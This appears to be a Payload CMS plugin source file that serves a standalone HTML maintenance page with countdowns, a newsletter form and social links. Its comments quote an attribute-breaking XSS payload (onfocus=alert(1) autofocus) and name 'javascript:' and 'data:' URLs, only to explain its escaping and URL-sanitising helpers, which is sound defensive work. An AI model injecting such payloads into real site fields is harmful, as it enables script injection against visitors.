import type { PayloadHandler } from 'payload'

/**
 * Standalone HTML maintenance page endpoint.
 * Returns a self-contained HTML page (no React/Next.js) that fetches
 * /api/maintenance/status and renders the appropriate template client-side.
 */
export function createMaintenancePageHandler(basePath: string): PayloadHandler {
  return async () => {
    const statusUrl = `/api${basePath}/status`
    const newsletterUrl = `/api${basePath}/newsletter`
    const trackUrl = `/api${basePath}/track`

    const html = `<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<meta name="robots" content="noindex,nofollow">
<title>Maintenance</title>
<style>
*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
html,body{height:100%;-webkit-font-smoothing:antialiased;-moz-osx-font-smoothing:grayscale}
body{font-family:system-ui,-apple-system,"Segoe UI",Roboto,sans-serif;background:#0f172a;color:#f8fafc}

/* Loading spinner */
.m-loading{display:flex;align-items:center;justify-content:center;min-height:100vh;background:#0f172a}
.m-spinner{width:40px;height:40px;border:3px solid #3b82f6;border-top-color:transparent;border-radius:50%;animation:spin 1s linear infinite}

/* Animations */
@keyframes spin{to{transform:rotate(360deg)}}
@keyframes maint-float{0%,100%{transform:translateY(0)}50%{transform:translateY(-6px)}}
@keyframes maint-blink{0%,100%{opacity:.4}50%{opacity:1}}
@keyframes maint-progress{0%{transform:translateX(-100%)}100%{transform:translateX(100%)}}
@keyframes maint-gradient-shift{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}

/* Aurora animations */
@keyframes aurora-shift1{0%{transform:translateX(-30%) scaleY(1)}25%{transform:translateX(-10%) scaleY(1.2)}50%{transform:translateX(10%) scaleY(.9)}75%{transform:translateX(-5%) scaleY(1.1)}100%{transform:translateX(-30%) scaleY(1)}}
@keyframes aurora-shift2{0%{transform:translateX(20%) scaleY(1.1)}33%{transform:translateX(-15%) scaleY(.8)}66%{transform:translateX(5%) scaleY(1.3)}100%{transform:translateX(20%) scaleY(1.1)}}
@keyframes aurora-shift3{0%{transform:translateX(0%) scaleY(.9) rotate(-2deg)}50%{transform:translateX(-20%) scaleY(1.15) rotate(2deg)}100%{transform:translateX(0%) scaleY(.9) rotate(-2deg)}}
@keyframes aurora-glow{0%,100%{opacity:.6}50%{opacity:1}}
@keyframes aurora-particle{0%{transform:translateY(0) translateX(0);opacity:0}10%{opacity:1}90%{opacity:1}100%{transform:translateY(-100vh) translateX(20px);opacity:0}}
@keyframes aurora-wave{0%{d:path('M0,300 C200,280 400,320 600,290 C800,260 1000,310 1200,300 L1200,400 L0,400 Z')}50%{d:path('M0,310 C200,330 400,270 600,310 C800,290 1000,330 1200,290 L1200,400 L0,400 Z')}100%{d:path('M0,300 C200,280 400,320 600,290 C800,260 1000,310 1200,300 L1200,400 L0,400 Z')}}

/* Neon animations */
@keyframes neon-pulse{0%,100%{text-shadow:0 0 7px var(--neon-c1),0 0 10px var(--neon-c1),0 0 21px var(--neon-c1),0 0 42px var(--neon-c2),0 0 82px var(--neon-c2),0 0 92px var(--neon-c2)}50%{text-shadow:0 0 4px var(--neon-c1),0 0 7px var(--neon-c1),0 0 13px var(--neon-c1),0 0 25px var(--neon-c2),0 0 50px var(--neon-c2),0 0 60px var(--neon-c2)}}
@keyframes neon-box-pulse{0%,100%{box-shadow:0 0 5px var(--neon-c1),0 0 10px var(--neon-c1),inset 0 0 5px var(--neon-c1)44}50%{box-shadow:0 0 10px var(--neon-c1),0 0 20px var(--neon-c1),0 0 40px var(--neon-c2),inset 0 0 10px var(--neon-c1)44}}
@keyframes neon-scanline{0%{top:-2px}100%{top:calc(100% + 2px)}}
@keyframes neon-flicker{0%,19%,21%,23%,25%,54%,56%,100%{opacity:1}20%,24%,55%{opacity:.4}}
@keyframes neon-corner{0%,100%{opacity:.6}50%{opacity:1}}

/* Neon glitch on hover */
.m-neon-title{position:relative;display:inline-block}
.m-neon-title:hover{animation:neon-flicker .3s linear}

/* Neon grid background */
.m-neon-grid{position:absolute;inset:0;background-image:linear-gradient(rgba(255,255,255,.03) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,.03) 1px,transparent 1px);background-size:60px 60px}

/* Neon scanline */
.m-neon-scanline{position:absolute;left:0;right:0;height:2px;z-index:0;filter:blur(1px);animation:neon-scanline 4s linear infinite}

/* Neon corner brackets */
.m-neon-corner{position:absolute;width:24px;height:24px;z-index:2;animation:neon-corner 2s ease-in-out infinite}
.m-neon-corner--tl{top:16px;left:16px;border-top:2px solid;border-left:2px solid}
.m-neon-corner--tr{top:16px;right:16px;border-top:2px solid;border-right:2px solid}
.m-neon-corner--bl{bottom:16px;left:16px;border-bottom:2px solid;border-left:2px solid}
.m-neon-corner--br{bottom:16px;right:16px;border-bottom:2px solid;border-right:2px solid}

/* Mesh animations */
@keyframes mesh-blob1{0%{transform:translate(0,0) scale(1)}33%{transform:translate(100px,-50px) scale(1.2)}66%{transform:translate(-50px,80px) scale(.9)}100%{transform:translate(0,0) scale(1)}}
@keyframes mesh-blob2{0%{transform:translate(0,0) scale(1.1)}33%{transform:translate(-120px,60px) scale(.85)}66%{transform:translate(80px,-40px) scale(1.15)}100%{transform:translate(0,0) scale(1.1)}}
@keyframes mesh-blob3{0%{transform:translate(0,0) scale(.95)}33%{transform:translate(60px,100px) scale(1.1)}66%{transform:translate(-80px,-60px) scale(1)}100%{transform:translate(0,0) scale(.95)}}
@keyframes mesh-blob4{0%{transform:translate(0,0) rotate(0deg)}50%{transform:translate(-40px,40px) rotate(180deg)}100%{transform:translate(0,0) rotate(360deg)}}

.m-mesh-blob{position:absolute;border-radius:50%;filter:blur(80px);will-change:transform;mix-blend-mode:screen;opacity:.7}

/* Particles canvas */
.m-particles-canvas{position:fixed;inset:0;z-index:0;width:100%;height:100%}

/* Progress bar */
.m-progress-bar{position:fixed;top:0;left:0;right:0;height:2px;background:rgba(255,255,255,.06);z-index:100}
.m-progress-bar .m-progress-inner{height:100%;animation:maint-progress 2.5s ease-in-out infinite}

/* Language switcher */
.m-lang-switcher{position:fixed;top:1.25rem;right:1.25rem;display:flex;gap:.35rem;z-index:20}
.m-lang-btn{padding:.35rem .7rem;border-radius:.375rem;cursor:pointer;font-size:.75rem;text-transform:uppercase;transition:all .2s;backdrop-filter:blur(8px)}

/* Root templates */
.m-root{position:relative;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh;overflow:hidden}

/* Content wrapper */
.m-content{position:relative;z-index:1;display:flex;flex-direction:column;align-items:center;max-width:720px;width:100%;padding:2rem;text-align:center;gap:.25rem}

/* Glass card */
.m-glass-card{position:relative;z-index:1;max-width:600px;width:90%;padding:3rem 2.5rem;border-radius:1.5rem;background:rgba(255,255,255,.08);backdrop-filter:blur(24px) saturate(1.5);border:1px solid rgba(255,255,255,.15);box-shadow:0 24px 80px rgba(0,0,0,.25),inset 0 1px 0 rgba(255,255,255,.1);display:flex;flex-direction:column;align-items:center;text-align:center}

/* Overlay */
.m-overlay{position:absolute;inset:0;z-index:0}

/* Floating orbs */
.m-orb{position:absolute;border-radius:50%;filter:blur(60px);z-index:0}

/* Split screen */
.m-split{display:flex;min-height:100vh}
.m-split-content{flex:1;display:flex;flex-direction:column;align-items:center;justify-content:center;padding:3rem 2rem;text-align:center;min-width:0}
.m-split-content .m-content{max-width:520px}
.m-split-image{flex:1;position:relative;overflow:hidden;min-height:400px;background-size:cover;background-position:center}
.m-split-image-overlay{position:absolute;inset:0}

/* Video bg */
.m-video{position:absolute;inset:0;width:100%;height:100%;object-fit:cover;z-index:0}

/* Title gradient */
.m-title{font-size:clamp(1.5rem,4.5vw,2.75rem);font-weight:800;margin-bottom:.5rem;line-height:1.15;-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}

/* Description */
.m-desc{font-size:clamp(.9rem,2.2vw,1.1rem);opacity:.75;max-width:520px;line-height:1.75;margin-bottom:1.5rem;white-space:pre-line}

/* Icon circle */
.m-icon-circle{width:72px;height:72px;border-radius:50%;display:flex;align-items:center;justify-content:center;animation:maint-float 3s ease-in-out infinite;margin-bottom:1rem}

/* Logo */
.m-logo{max-width:220px;max-height:80px;margin-bottom:1.5rem;object-fit:contain;filter:drop-shadow(0 2px 8px rgba(0,0,0,.3))}

/* Countdown ring */
.m-ring-wrap{display:flex;flex-direction:column;align-items:center;gap:.25rem}
.m-ring-label{font-size:.7rem;text-transform:uppercase;letter-spacing:.12em;opacity:.6}

/* Countdown flip */
.m-flip-wrap{display:flex;flex-direction:column;align-items:center;gap:.4rem}
.m-flip-card{position:relative;width:76px;height:84px;border-radius:.75rem;display:flex;align-items:center;justify-content:center;overflow:hidden}
.m-flip-line{position:absolute;left:0;right:0;top:50%;height:1px;background:rgba(0,0,0,.2)}
.m-flip-val{font-size:2.5rem;font-weight:800;font-variant-numeric:tabular-nums}
.m-flip-label{font-size:.65rem;text-transform:uppercase;letter-spacing:.15em;opacity:.5;font-weight:500}

/* Separator */
.m-sep{display:flex;flex-direction:column;gap:.6rem;padding-bottom:1.2rem}
.m-sep-dot{width:5px;height:5px;border-radius:50%;opacity:.4}
.m-sep-dot:nth-child(2){animation-delay:.5s}

/* Newsletter */
.m-newsletter{display:flex;gap:.5rem;width:100%;max-width:440px;margin-bottom:1.5rem}
.m-newsletter input{flex:1;padding:.7rem 1rem;border-radius:.5rem;border:1px solid rgba(255,255,255,.15);background:rgba(255,255,255,.06);font-size:.9rem;backdrop-filter:blur(8px);transition:border-color .2s}
/* outline:none used to be in the rule above, with nothing put back: a keyboard
   user had no way to tell the field was focused. Unlike the inline style on the
   React renderer, CSS can carry a real replacement, so this one gets a designed
   ring rather than just the browser default. currentColor follows the
   configured text colour, which is readable on the configured background. */
.m-newsletter input:focus-visible{outline:2px solid currentColor;outline-offset:2px}
.m-newsletter button{padding:.7rem 1.5rem;border-radius:.5rem;border:none;color:#fff;font-weight:600;font-size:.9rem;cursor:pointer;white-space:nowrap;transition:transform .15s,opacity .2s}
.m-newsletter button:hover{transform:scale(1.02)}

/* Success message */
.m-newsletter-success{display:flex;align-items:center;gap:.5rem;margin-bottom:1.5rem}
.m-newsletter-success span{font-weight:600;font-size:.9rem}

/* CTA */
.m-cta{display:inline-flex;align-items:center;gap:.5rem;padding:.75rem 2rem;color:#fff;border-radius:.5rem;text-decoration:none;font-weight:600;font-size:.95rem;transition:all .25s;margin-bottom:1.5rem}
.m-cta:hover{transform:translateY(-2px)}

/* Contact */
.m-contact{display:inline-flex;align-items:center;gap:.4rem;opacity:.6;text-decoration:none;font-size:.85rem;margin-bottom:1.25rem;transition:opacity .2s}
.m-contact:hover{opacity:1}

/* Social */
.m-social{display:flex;gap:.6rem;flex-wrap:wrap;justify-content:center}
.m-social a{display:flex;align-items:center;justify-content:center;width:40px;height:40px;border-radius:50%;border:1px solid rgba(255,255,255,.12);background:rgba(255,255,255,.04);transition:all .25s}
.m-social a:hover{transform:translateY(-2px);background:var(--m-accent,rgba(255,255,255,.04));border-color:var(--m-accent,rgba(255,255,255,.12))}

/* Emoji */
.m-emoji{font-size:2.5rem;margin-bottom:.75rem}

/* Decorative gradient orbs for default template */
.m-decor-orb{position:absolute;border-radius:50%;z-index:0}

/* Responsive */
@media(max-width:768px){.m-split-image{display:none!important}}
@media(max-width:480px){.m-root,.m-split{padding:1rem!important}}
</style>
</head>
<body>

<div id="app">
  <div class="m-loading"><div class="m-spinner"></div></div>
</div>

<script>
(function(){
  var STATUS_URL = ${JSON.stringify(statusUrl)};
  var NEWSLETTER_URL = ${JSON.stringify(newsletterUrl)};
  var TRACK_URL = ${JSON.stringify(trackUrl)};

  // ─── i18n ───
  var i18n = {
    fr: { days:'Jours',hours:'Heures',minutes:'Minutes',seconds:'Secondes',returnDate:'Retour prévu le',contact:'Nous contacter',newsletterSuccess:'Merci ! Vous serez notifié(e) du retour du site.',newsletterError:'Une erreur est survenue.',emailLabel:'Votre adresse email',followUs:'Suivez-nous',loading:'Chargement...' },
    en: { days:'Days',hours:'Hours',minutes:'Minutes',seconds:'Seconds',returnDate:'Expected return on',contact:'Contact us',newsletterSuccess:'Thank you! You will be notified when the site is back.',newsletterError:'An error occurred. Please try again.',emailLabel:'Your email address',followUs:'Follow us',loading:'Loading...' },
    de: { days:'Tage',hours:'Stunden',minutes:'Minuten',seconds:'Sekunden',returnDate:'Voraussichtliche Rückkehr am',contact:'Kontaktieren Sie uns',newsletterSuccess:'Danke! Sie werden benachrichtigt.',newsletterError:'Ein Fehler ist aufgetreten.',emailLabel:'Ihre E-Mail-Adresse',followUs:'Folgen Sie uns',loading:'Laden...' },
    es: { days:'Días',hours:'Horas',minutes:'Minutos',seconds:'Segundos',returnDate:'Regreso previsto el',contact:'Contáctenos',newsletterSuccess:'¡Gracias! Le notificaremos.',newsletterError:'Ha ocurrido un error.',emailLabel:'Su direccion de correo',followUs:'Síguenos',loading:'Cargando...' },
    it: { days:'Giorni',hours:'Ore',minutes:'Minuti',seconds:'Secondi',returnDate:'Ritorno previsto il',contact:'Contattaci',newsletterSuccess:'Grazie! Sarai avvisato.',newsletterError:'Si è verificato un errore.',emailLabel:'Il tuo indirizzo email',followUs:'Seguici',loading:'Caricamento...' },
    pt: { days:'Dias',hours:'Horas',minutes:'Minutos',seconds:'Segundos',returnDate:'Retorno previsto em',contact:'Contacte-nos',newsletterSuccess:'Obrigado! Será notificado.',newsletterError:'Ocorreu um erro.',emailLabel:'O seu endereco de email',followUs:'Siga-nos',loading:'Carregando...' },
    nl: { days:'Dagen',hours:'Uren',minutes:'Minuten',seconds:'Seconden',returnDate:'Verwachte terugkeer op',contact:'Neem contact op',newsletterSuccess:'Bedankt! U wordt op de hoogte gebracht.',newsletterError:'Er is een fout opgetreden.',emailLabel:'Uw e-mailadres',followUs:'Volg ons',loading:'Laden...' },
    ja: { days:'日',hours:'時間',minutes:'分',seconds:'秒',returnDate:'復旧予定日',contact:'お問い合わせ',newsletterSuccess:'ありがとうございます！',newsletterError:'エラーが発生しました。',emailLabel:'メールアドレス',followUs:'フォロー',loading:'読み込み中...' },
    ar: { days:'أيام',hours:'ساعات',minutes:'دقائق',seconds:'ثوانٍ',returnDate:'تاريخ العودة المتوقع',contact:'اتصل بنا',newsletterSuccess:'شكراً لك!',newsletterError:'حدث خطأ.',emailLabel:'بريدك الإلكتروني',followUs:'تابعنا',loading:'جار التحميل...' },
    zh: { days:'天',hours:'小时',minutes:'分钟',seconds:'秒',returnDate:'预计恢复日期',contact:'联系我们',newsletterSuccess:'谢谢！',newsletterError:'发生错误。',emailLabel:'您的电子邮箱',followUs:'关注我们',loading:'加载中...' }
  };

  function t(lang, key) {
    return (i18n[lang] && i18n[lang][key]) || (i18n.en && i18n.en[key]) || key;
  }

  // ─── Social icon SVG paths ───
  var socialPaths = {
    facebook: 'M18 2h-3a5 5 0 0 0-5 5v3H7v4h3v8h4v-8h3l1-4h-4V7a1 1 0 0 1 1-1h3z',
    instagram: 'M7.5 2h9A5.5 5.5 0 0 1 22 7.5v9a5.5 5.5 0 0 1-5.5 5.5h-9A5.5 5.5 0 0 1 2 16.5v-9A5.5 5.5 0 0 1 7.5 2m4.5 5a5 5 0 1 0 0 10 5 5 0 0 0 0-10m0 2a3 3 0 1 1 0 6 3 3 0 0 1 0-6m5.1-2.3a1.2 1.2 0 1 0 0 2.4 1.2 1.2 0 0 0 0-2.4',
    twitter: 'M4 4l6.5 8L4 20h2l5.5-6.8L16 20h4l-7-8.5L19.5 4h-2L12.3 10 8 4H4',
    linkedin: 'M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-4 0v7h-4v-7a6 6 0 0 1 6-6zM2 9h4v12H2zM4 2a2 2 0 1 1 0 4 2 2 0 0 1 0-4',
    youtube: 'M22.54 6.42a2.78 2.78 0 0 0-1.94-2C18.88 4 12 4 12 4s-6.88 0-8.6.46a2.78 2.78 0 0 0-1.94 2A29 29 0 0 0 1 12a29 29 0 0 0 .46 5.58A2.78 2.78 0 0 0 3.4 19.6C5.12 20 12 20 12 20s6.88 0 8.6-.46a2.78 2.78 0 0 0 1.94-2A29 29 0 0 0 23 12a29 29 0 0 0-.46-5.58zM9.75 15.02V8.98L15.5 12l-5.75 3.02z',
    tiktok: 'M9 12a4 4 0 1 0 4 4V4a5 5 0 0 0 5 5',
    github: 'M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22',
    other: 'M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71'
  };

  var typeEmojis = { maintenance:'\\u{1F527}', 'coming-soon':'\\u{1F680}', upgrade:'\\u2B06\\uFE0F', emergency:'\\u{1F6A8}' };

  // ─── Helpers ───
  var currentLang = 'fr';
  var countdownInterval = null;

  function detectLanguage(messages) {
    var bl = (navigator.language || 'fr').split('-')[0];
    var match = messages.find(function(m){ return m.language === bl; });
    return match ? bl : (messages[0] && messages[0].language) || 'fr';
  }

  function formatDate(dateStr, lang) {
    try {
      return new Intl.DateTimeFormat(lang, { dateStyle:'long', timeStyle:'short' }).format(new Date(dateStr));
    } catch(e) { return dateStr; }
  }

  function pad(n) { return String(n).padStart(2, '0'); }

  // textContent/innerHTML escapes & < > but NOT the double quote, so every
  // value interpolated inside a quoted attribute (socialLinks[].url,
  // messages[].buttonUrl, logoUrl, lottieUrl, contactEmail...) could close its
  // own attribute with '" onfocus=alert(1) autofocus x="'.
  function esc(s) {
    return String(s == null ? '' : s)
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#39;');
  }

  // Only http(s), mailto and site-relative paths may reach an href/src.
  // 'javascript:' and 'data:' are the classic stored-XSS payloads for a field
  // an editor can fill in.
  function safeUrl(u, allowMailto) {
    var raw = String(u == null ? '' : u).trim();
    if (!raw) return '';
    if (/^\\/(?!\\/)/.test(raw)) return raw;
    var lower = raw.toLowerCase();
    if (lower.indexOf('http://') === 0 || lower.indexOf('https://') === 0) return raw;
    if (allowMailto && lower.indexOf('mailto:') === 0) return raw;
    return '';
  }

  // A URL that lands inside 'url("…")' must not carry a quote, a parenthesis or
  // whitespace: those close the CSS string and then the style attribute.
  function cssUrl(u) {
    var href = safeUrl(u);
    if (!href || /["'()\\\\\\s;]/.test(href)) return '';
    return href;
  }

  // Colours are concatenated into style attributes and CSS custom properties:
  // anything that is not a colour literal is dropped rather than escaped, so it
  // can neither close the attribute nor inject extra declarations.
  function col(c, fallback) {
    var raw = String(c == null ? '' : c).trim();
    if (/^#(?:[0-9a-f]{3,4}|[0-9a-f]{6}|[0-9a-f]{8})$/i.test(raw)) return raw;
    if (/^(?:rgb|rgba|hsl|hsla)\\([0-9a-z.,%\\s\\/]*\\)$/i.test(raw)) return raw;
    if (/^[a-z]{3,20}$/i.test(raw)) return raw;
    return fallback;
  }

  function socialIcon(platform, color) {
    var p = socialPaths[platform] || socialPaths.other;
    return '<svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="'+esc(color)+'" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="'+p+'"/></svg>';
  }

  // ─── Countdown ───
  function getCountdown(target) {
    var diff = new Date(target).getTime() - Date.now();
    if (diff <= 0) return { days:0, hours:0, minutes:0, seconds:0, expired:true };
    return {
      days: Math.floor(diff / 86400000),
      hours: Math.floor((diff / 3600000) % 24),
      minutes: Math.floor((diff / 60000) % 60),
      seconds: Math.floor((diff / 1000) % 60),
      expired: false
    };
  }

  // ─── Dark mode ───
  function isDarkMode(mode) {
    if (mode === 'light') return false;
    if (mode === 'dark') return true;
    return window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches;
  }

  // ─── Build countdown rings (SVG) ───
  function countdownRing(val, max, label, accent, textColor) {
    var r = 40, c = 2 * Math.PI * r;
    var off = ((max - val) / max) * c;
    return '<div class="m-ring-wrap">' +
      '<svg width="96" height="96" viewBox="0 0 96 96" style="filter:drop-shadow(0 0 8px rgba(0,0,0,.3))">' +
      '<circle cx="48" cy="48" r="'+r+'" fill="none" stroke="rgba(255,255,255,.08)" stroke-width="3"/>' +
      '<circle cx="48" cy="48" r="'+r+'" fill="none" stroke="'+esc(accent)+'" stroke-width="3" stroke-linecap="round" ' +
      'stroke-dasharray="'+c+'" stroke-dashoffset="'+off+'" transform="rotate(-90 48 48)" style="transition:stroke-dashoffset .5s ease"/>' +
      '<text x="48" y="48" text-anchor="middle" dominant-baseline="central" fill="'+esc(textColor)+'" font-size="28" font-weight="700" style="font-variant-numeric:tabular-nums">'+pad(val)+'</text>' +
      '</svg>' +
      '<span class="m-ring-label" style="color:'+esc(textColor)+'">'+esc(label)+'</span></div>';
  }

  // ─── Build countdown flip cards ───
  function countdownFlip(val, label, accent, textColor, glass) {
    var bgc = glass ? 'rgba(255,255,255,.1)' : 'rgba(255,255,255,.06)';
    var bdc = glass ? 'rgba(255,255,255,.2)' : 'rgba(255,255,255,.1)';
    var bf = glass ? 'blur(20px)' : 'blur(12px)';
    var bs = glass
      ? '0 8px 32px rgba(0,0,0,.2),inset 0 1px 0 rgba(255,255,255,.1)'
      : '0 4px 20px rgba(0,0,0,.3),inset 0 1px 0 rgba(255,255,255,.05)';
    return '<div class="m-flip-wrap">' +
      '<div class="m-flip-card" style="background:'+bgc+';border:1px solid '+bdc+';backdrop-filter:'+bf+';box-shadow:'+bs+'">' +
      '<div class="m-flip-line"></div>' +
      '<span class="m-flip-val" style="color:'+esc(textColor)+';text-shadow:0 0 20px '+esc(accent)+'33">'+pad(val)+'</span>' +
      '</div>' +
      '<span class="m-flip-label" style="color:'+esc(textColor)+'">'+esc(label)+'</span></div>';
  }

  function separator(accent) {
    return '<div class="m-sep">' +
      '<div class="m-sep-dot" style="background:'+esc(accent)+';animation:maint-blink 1.5s ease-in-out infinite"></div>' +
      '<div class="m-sep-dot" style="background:'+esc(accent)+';animation:maint-blink 1.5s ease-in-out infinite .5s"></div></div>';
  }

  // ─── Newsletter form ───
  function newsletterHTML(data, accent, textColor) {
    if (!data.showNewsletterForm) return '';
    return '<div style="width:100%;display:flex;justify-content:center;margin-bottom:1.5rem">' +
      '<form class="m-newsletter" id="m-nl-form">' +
      // A placeholder is not an accessible name: it is not exposed as one and it
      // vanishes on the first keystroke. This is the only form control the
      // plugin renders, and it had none.
      '<input type="email" id="m-nl-email" aria-label="'+esc(t(currentLang,'emailLabel'))+'" placeholder="'+esc(data.newsletterPlaceholder || 'votre@email.com')+'" required style="color:'+esc(textColor)+'">' +
      '<button type="submit" style="background:'+esc(accent)+'">'+esc(data.newsletterButtonLabel || 'Me notifier')+'</button>' +
      '</form></div>';
  }

  // ─── Social links ───
  function socialHTML(links, textColor, accent) {
    if (!links || !links.length) return '';
    var h = '<div class="m-social" style="--m-accent:'+esc(col(accent, '#3b82f6'))+'">';
    links.forEach(function(l) {
      var href = safeUrl(l.url);
      if (!href) return;
      // Hover is a CSS rule (.m-social a:hover) — the accent colour has no
      // business being concatenated into an inline event handler.
      h += '<a href="'+esc(href)+'" target="_blank" rel="noopener noreferrer" title="'+esc(l.label || l.platform)+'">' +
        socialIcon(l.platform, textColor) + '</a>';
    });
    h += '</div>';
    return h;
  }

  // ─── Content block (shared across templates) ───
  function buildContent(data, msg, cd, accent, textColor, glass) {
    var h = '';

    // Type emoji
    if (data.maintenanceType) {
      var emoji = typeEmojis[data.maintenanceType] || typeEmojis.maintenance;
      h += '<div class="m-emoji" role="img" aria-label="'+esc(data.maintenanceType)+'">'+emoji+'</div>';
    }

    // Lottie
    if (data.lottieUrl) {
      h += '<div style="width:200px;height:200px;margin:0 auto 1.5rem"><dotlottie-player src="'+esc(safeUrl(data.lottieUrl))+'" background="transparent" speed="1" style="width:100%;height:100%" loop autoplay></dotlottie-player></div>';
    }

    // Logo
    if (data.logoUrl) {
      h += '<img src="'+esc(safeUrl(data.logoUrl))+'" alt="Logo" class="m-logo">';
    }

    // Icon for minimal/video-background
    if (!data.logoUrl && !data.lottieUrl && (data.template === 'minimal' || data.template === 'video-background')) {
      h += '<div><div class="m-icon-circle" style="background:'+esc(accent)+'15;border:1px solid '+esc(accent)+'30">' +
        '<svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke="'+esc(accent)+'" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round">' +
        '<path d="M14.7 6.3a1 1 0 0 0 0 1.4l1.6 1.6a1 1 0 0 0 1.4 0l3.77-3.77a6 6 0 0 1-7.94 7.94l-6.91 6.91a2.12 2.12 0 0 1-3-3l6.91-6.91a6 6 0 0 1 7.94-7.94l-3.76 3.76z"/>' +
        '</svg></div></div>';
    }

    // Title
    h += '<h1 class="m-title" style="background:linear-gradient(135deg,'+esc(textColor)+','+esc(accent)+')">'+esc(msg ? msg.title : 'Maintenance')+'</h1>';

    // Description
    h += '<p class="m-desc" style="color:'+esc(textColor)+'">'+esc(msg ? msg.description : '')+'</p>';

    // Countdown
    var showCountdown = ['countdown','coming-soon','glassmorphism','gradient','aurora','neon','mesh','particles'].indexOf(data.template) !== -1 && data.estimatedEnd && !cd.expired;
    if (showCountdown) {
      h += '<div id="m-countdown" style="margin-bottom:2rem">';
      if (data.template === 'countdown') {
        // Rings
        h += '<div style="display:flex;gap:clamp(.5rem,2vw,1.25rem);flex-wrap:wrap;justify-content:center">';
        h += countdownRing(cd.days, 365, t(currentLang,'days'), accent, textColor);
        h += countdownRing(cd.hours, 24, t(currentLang,'hours'), accent, textColor);
        h += countdownRing(cd.minutes, 60, t(currentLang,'minutes'), accent, textColor);
        h += countdownRing(cd.seconds, 60, t(currentLang,'seconds'), accent, textColor);
        h += '</div>';
      } else {
        // Flip
        h += '<div style="display:flex;align-items:center;gap:clamp(.4rem,1.5vw,.75rem);flex-wrap:wrap;justify-content:center">';
        h += countdownFlip(cd.days, t(currentLang,'days'), accent, textColor, glass);
        h += separator(accent);
        h += countdownFlip(cd.hours, t(currentLang,'hours'), accent, textColor, glass);
        h += separator(accent);
        h += countdownFlip(cd.minutes, t(currentLang,'minutes'), accent, textColor, glass);
        h += separator(accent);
        h += countdownFlip(cd.seconds, t(currentLang,'seconds'), accent, textColor, glass);
        h += '</div>';
      }
      h += '</div>';
    }

    // Estimated end without countdown
    if (!showCountdown && data.estimatedEnd) {
      h += '<p style="font-size:.85rem;opacity:.5;margin-bottom:1.5rem;color:'+esc(textColor)+'">'+t(currentLang,'returnDate')+' '+formatDate(data.estimatedEnd, currentLang)+'</p>';
    }

    // Newsletter
    h += newsletterHTML(data, accent, textColor);

    // CTA
    if (msg && msg.buttonLabel && msg.buttonUrl) {
      h += '<a href="'+esc(safeUrl(msg.buttonUrl) || '#')+'" class="m-cta" style="background:'+esc(accent)+';box-shadow:0 4px 14px '+esc(accent)+'40">' +
        esc(msg.buttonLabel) +
        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M5 12h14M12 5l7 7-7 7"/></svg></a>';
    }

    // Contact
    if (data.contactEmail) {
      h += '<a href="'+esc(safeUrl('mailto:' + String(data.contactEmail || '').replace(/[\\s"'<>]/g, ''), true))+'" class="m-contact" style="color:'+esc(textColor)+'">' +
        '<svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect width="20" height="16" x="2" y="4" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/></svg>' +
        esc(data.contactEmail) + '</a>';
    }

    // Social
    h += socialHTML(data.socialLinks, textColor, accent);

    return h;
  }

  // ─── Template wrappers ───
  function wrapDefault(data, content, bg, textColor, accent, overlayOpacity) {
    var bgStyle = data.backgroundImageUrl
      ? 'background:url(&quot;'+esc(cssUrl(data.backgroundImageUrl))+'&quot;) center/cover no-repeat fixed'
      : 'background:'+bg;
    var overlay = data.backgroundImageUrl
      ? '<div class="m-overlay" style="background:'+esc(bg)+';opacity:'+overlayOpacity+'"></div>'
      : '';
    return '<div class="m-root" style="'+bgStyle+';color:'+esc(textColor)+'">' +
      overlay +
      '<div class="m-decor-orb" style="width:500px;height:500px;background:radial-gradient(circle,'+esc(accent)+'15,transparent 70%);top:-200px;right:-100px"></div>' +
      '<div class="m-decor-orb" style="width:400px;height:400px;background:radial-gradient(circle,'+esc(accent)+'10,transparent 70%);bottom:-150px;left:-100px"></div>' +
      '<div class="m-content">'+content+'</div></div>';
  }

  function wrapGlass(data, content, bg, textColor, accent, overlayOpacity) {
    var bgStyle = data.backgroundImageUrl
      ? 'background:url(&quot;'+esc(cssUrl(data.backgroundImageUrl))+'&quot;) center/cover no-repeat fixed'
      : 'background:linear-gradient(135deg,'+esc(bg)+','+esc(accent)+'22)';
    var overlay = data.backgroundImageUrl
      ? '<div class="m-overlay" style="background:'+esc(bg)+';opacity:'+overlayOpacity+'"></div>'
      : '';
    return '<div class="m-root" style="'+bgStyle+';color:'+esc(textColor)+';align-items:center;justify-content:center">' +
      overlay +
      '<div class="m-glass-card">'+content+'</div>' +
      '<div class="m-orb" style="width:300px;height:300px;background:'+esc(accent)+';opacity:.08;top:10%;left:5%;animation:maint-float 6s ease-in-out infinite"></div>' +
